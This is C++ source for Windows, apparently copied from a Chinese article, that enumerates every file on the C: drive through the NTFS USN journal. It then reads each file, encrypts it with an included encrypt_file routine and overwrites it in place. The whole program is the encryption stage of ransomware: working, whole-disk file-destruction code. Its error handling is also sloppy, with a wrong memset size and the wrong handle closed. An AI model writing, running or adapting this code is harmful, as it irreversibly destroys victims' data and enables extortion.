//https://codeleading.com/article/85573907295/

#include <Windows.h>
#include <stdio.h>
#include "..\method1\utils.h"
#include "..\method1\encryp.h"

constexpr int enum_sun = FSCTL_ENUM_USN_DATA;

int main() {
  if (!IsVolumeNTFS((WCHAR*)L"C:")) return 0;

  std::locale::global(std::locale(""));

  DWORD dwError;
  WCHAR driveletter[] = L"\\\\.\\C:";
  HANDLE hVol = CreateFile(driveletter, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
  if (hVol == INVALID_HANDLE_VALUE) {
          printf("CreateFile失败 原因:");
    DisplayError(GetLastError());
    return 1;
  }
  USN_JOURNAL_DATA journalData;
  PUSN_RECORD usnRecord;
  DWORD dwBytes;
  DWORD dwRetBytes;
  char buffer[USN_PAGE_SIZE];
  BOOL bDioControl =
      DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &journalData,
                      sizeof(journalData), &dwBytes, NULL);
  if (!bDioControl) {
    printf("FSCTL_QUERY_USN_JOURNAL失败 原因:");
    DisplayError(GetLastError());
    return 1;
  }

  // MFT_ENUM_DATA_V0 或 MFT_ENUM_DATA_V1
  MFT_ENUM_DATA_V0 med;
  med.StartFileReferenceNumber = 0;
  med.LowUsn = 0;
  med.HighUsn = journalData.NextUsn;
  while (dwBytes > sizeof(USN)) {
    memset(buffer, 0, sizeof(USN_PAGE_SIZE));
    bDioControl = DeviceIoControl(hVol, FSCTL_ENUM_USN_DATA, &med, sizeof(med),
                                  /*&*/ buffer, USN_PAGE_SIZE, &dwBytes, NULL);

    if (!bDioControl) {
      dwError = GetLastError();  // 0x57
      DisplayError(dwError);
      break;
    }

    dwRetBytes = dwBytes - sizeof(USN);
    usnRecord = (PUSN_RECORD)(((PUCHAR)buffer) + sizeof(USN));
    FILE_ID_DESCRIPTOR Des;
    Des.dwSize = sizeof(FILE_ID_DESCRIPTOR);
    Des.FileId.QuadPart = usnRecord->FileReferenceNumber;
    Des.Type = FileIdType;
    while (dwRetBytes > 0) {
      HANDLE f = OpenFileById(hVol, &Des, 0, 0, NULL, 0);
      WCHAR FilePath[MAX_PATH]{};
      GetFinalPathNameByHandleW(f, FilePath, MAX_PATH, 0);
      if (f != INVALID_HANDLE_VALUE && !(usnRecord->FileAttributes&FILE_ATTRIBUTE_DIRECTORY)) {
        printf("%ws\n", FilePath);

        HANDLE h = CreateFileW(FilePath, FILE_WRITE_ACCESS,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
          CloseHandle(f);
        }

        uint32_t file_size = GetFileSize(h, 0);

        uint8_t *fb = new uint8_t[file_size];

        DWORD bytes_read;
        bool b = ReadFile(h, fb, file_size, &bytes_read, 0);
        if (!b) {
        }
        encrypt_file(fb, file_size);
        b = WriteFile(h, fb, file_size, &bytes_read, 0);
        if (!b) {
        }
        if (h != INVALID_HANDLE_VALUE ) CloseHandle(f);
        
      }
      dwRetBytes -= usnRecord->RecordLength;
      usnRecord = (PUSN_RECORD)(((PCHAR)usnRecord) + usnRecord->RecordLength);
    }
    med.StartFileReferenceNumber = *(DWORDLONG*)buffer;
  }
  CloseHandle(hVol);
  return 0;
}